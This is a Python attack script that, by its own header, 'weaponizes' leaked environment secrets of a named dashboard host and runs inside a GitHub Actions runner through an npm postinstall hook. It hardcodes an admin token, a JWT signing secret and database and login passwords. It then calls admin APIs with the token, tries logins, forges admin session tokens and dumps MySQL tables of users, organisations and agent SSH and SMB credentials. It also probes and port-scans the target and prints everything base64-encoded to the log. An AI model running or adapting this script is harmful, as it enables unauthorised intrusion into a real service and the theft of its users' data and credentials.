#!/usr/bin/env python3
# i28934 round1: weaponize dashboard.lumiiai.cn .env.local real secrets
# runs inside GitHub Actions runner (clean egress) via npm postinstall
import os, sys, json, time, base64, hmac, hashlib, subprocess, socket, re

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
MY_USER = "lumii"; MY_PASS = "yN0mGEj9a0grwbsW1pv7clFv"; MY_DB = "lumii"
TARGET_IP = "122.51.1.87"
RELAY_SECRET = "f5654a28c48fff84fc263a9704140651"
IDE_USER = "lumii-assistant-internal"; IDE_PASS = "Rm9OE6RbCmn1ZcQICX1ZTnyjohUi"

T0 = time.time()
def el(): return int(time.time()-T0)
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def curl(args, timeout=45):
    try:
        r = subprocess.run(["curl","-s","-k","-m",str(timeout)]+args, capture_output=True, timeout=timeout+20)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, hdrs=None, timeout=45, maxlen=250000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2","-A",UA,"-H","Accept: application/json, text/plain, */*",
            "-H","Referer: https://%s/"%HOST,"-H","Origin: https://%s"%HOST,
            "-w","\n__CODE__%{http_code}"]
    if hdrs:
        for k,v in hdrs.items(): args += ["-H","%s: %s"%(k,v)]
    if body is not None:
        args += ["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method != "GET":
        args += ["-X",method]
    args += [url]
    rc,out,err = curl(args, timeout=timeout)
    txt = out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:160]}

def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(payload, secret=JWT_SECRET):
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")))
    p = b64u(json.dumps(payload, separators=(",",":")))
    sig = b64u(hmac.new(secret.encode(), (h+"."+p).encode(), hashlib.sha256).digest())
    return h+"."+p+"."+sig

def tcpport(ip, port, t=8):
    try:
        s = socket.create_connection((ip,port), timeout=t); s.close(); return True
    except Exception as e:
        return False

# ---------- 1. health ----------
try:
    h = call("/api/health", timeout=30)
    R("health", {"code":h["code"],"body":h["body"][:600]})
except Exception as e:
    R("health_err", repr(e))

# ---------- 2. admin/agents with real ADMIN_TOKEN ----------
aa = call("/api/admin/agents", hdrs={"Authorization":"Bearer "+ADMIN_TOKEN}, timeout=60, maxlen=300000)
R("admin_agents_meta", {"code":aa["code"],"len":aa["len"]})
AGENTS = []
doc = J(aa)
if doc and isinstance(doc, dict):
    AGENTS = doc.get("agents") or []
    R("admin_agents_full", json.dumps(doc, ensure_ascii=False)[:300000])
    R("admin_agents_count", len(AGENTS))
else:
    R("admin_agents_body", aa["body"][:2000])

# ---------- 3. internal/connected-agents ----------
ic = call("/api/internal/connected-agents", hdrs={"x-internal-token": ADMIN_TOKEN}, timeout=45)
R("internal_connected", {"code":ic["code"],"body":ic["body"][:4000]})

# ---------- 4. login attempts ----------
for ident in [IDE_USER, IDE_USER+"@", "admin@lumii-ai.cn"]:
    try:
        rc,out,err = curl(["--http2","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                           "--data-binary",json.dumps({"identifier":ident,"password":IDE_PASS}),
                           "https://%s/api/auth/login"%HOST], timeout=40)
        txt = out.decode("utf-8","replace")
        m = re.search(r"HTTP/[0-9.]+ (\d{3})", txt)
        code = m.group(1) if m else "?"
        mc = re.search(r"set-cookie:\s*session=([^;]+)", txt, re.I)
        sck = bool(mc)
        body = txt.split("\r\n\r\n",1)[-1] if "\r\n\r\n" in txt else txt
        R("login_%s"%ident.replace("@","_at_"), {"code":code,"setcookie":sck,"body":body[:400]})
    except Exception as e:
        R("login_err_%s"%ident, repr(e))

# ---------- 5. forge HS256 session ----------
# find org customer from agents
customer = None
owner = None
for a in AGENTS:
    if a.get("customer"): customer = customer or a["customer"]
    if a.get("imOwnerUserId"): owner = owner or a["imOwnerUserId"]
R("derived", {"customer":customer,"owner":owner,"n_agents":len(AGENTS)})

test_payloads = []
if owner and customer:
    test_payloads.append({"userId":owner,"email":"probe@x","customer":customer,"role":"admin"})
# known assistant admin as generic test
test_payloads.append({"userId":"usr_ZxLewKrgbRYSm7rWDtQX8","email":"probe@x","customer":customer or "org_bTLzxtBLmugV8uxx4QTyw","role":"admin"})

for idx,tp in enumerate(test_payloads):
    tok = forge(tp)
    me = call("/api/auth/me", hdrs={"Cookie":"session="+tok,"Authorization":"Bearer "+tok}, timeout=30)
    R("forge_me_%d"%idx, {"code":me["code"],"body":me["body"][:500],"payload":tp})
    al = call("/api/agents/list", hdrs={"Cookie":"session="+tok}, timeout=40, maxlen=200000)
    R("forge_agents_list_%d"%idx, {"code":al["code"],"body":al["body"][:80000]})

# ---------- 6. MySQL reachability + dump ----------
tcp3306 = tcpport(TARGET_IP, 3306)
R("mysql_tcp_3306", tcp3306)
if tcp3306:
    try:
        subprocess.run([sys.executable,"-m","pip","install","--quiet","pymysql"], timeout=120, capture_output=True)
        import pymysql
        conn = pymysql.connect(host=TARGET_IP, port=3306, user=MY_USER, password=MY_PASS, database=MY_DB,
                               connect_timeout=12, read_timeout=30)
        cur = conn.cursor()
        cur.execute("SHOW TABLES"); tabs=[r[0] for r in cur.fetchall()]
        R("mysql_tables", tabs)
        def dump(sql, key, limit=300):
            try:
                cur.execute(sql); cols=[d[0] for d in cur.description]
                rows=[dict(zip(cols,r)) for r in cur.fetchall()][:limit]
                for r in rows:
                    for kk,vv in list(r.items()):
                        if isinstance(vv,(bytes,bytearray)): r[kk]=base64.b64encode(vv).decode()
                R(key, {"cols":cols,"rows":rows})
            except Exception as e:
                R(key+"_err", repr(e))
        dump("SELECT id,name,customer,type,host,ssh_user,ssh_port,ttyd_port,ttyd_path,ttyd_credential,smb_user,smb_pass,im_owner_user_id,hostname,workspace_path,network_method,network_config,status FROM agents", "mysql_agents")
        dump("SELECT id,email,username,customer,display_name,last_login FROM users", "mysql_users")
        dump("SELECT user_id,agent_id FROM user_agents", "mysql_user_agents")
        dump("SELECT * FROM session_metadata LIMIT 100", "mysql_session_metadata")
        dump("SELECT * FROM org_members LIMIT 100", "mysql_org_members")
        dump("SELECT * FROM orgs LIMIT 50", "mysql_orgs")
        conn.close()
    except Exception as e:
        R("mysql_connect_err", repr(e)[:600])

# ---------- 7. 8788 relay reachability + probes ----------
tcp8788 = tcpport(TARGET_IP, 8788)
R("relay_tcp_8788", tcp8788)
if tcp8788:
    for p in ["/health","/","/api/desktop/devices","/api/agents","/api/desktop/sessions"]:
        try:
            rc,out,err = curl(["-s","-k","-m","12","-A",UA,"-w","\n__CODE__%{http_code}","http://%s:8788%s"%(TARGET_IP,p)], timeout=18)
            txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
            if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
            R("relay_%s"%re.sub(r'\W','_',p.strip('/') or 'root'), {"code":code,"body":txt[:800]})
        except Exception as e:
            R("relay_%s_err"%p, repr(e)[:200])

# also test other ports quickly
for p in [22,443,5432,3002,5000]:
    R("tcp_%d"%p, tcpport(TARGET_IP,p,5))

R("done", {"elapsed":el()})
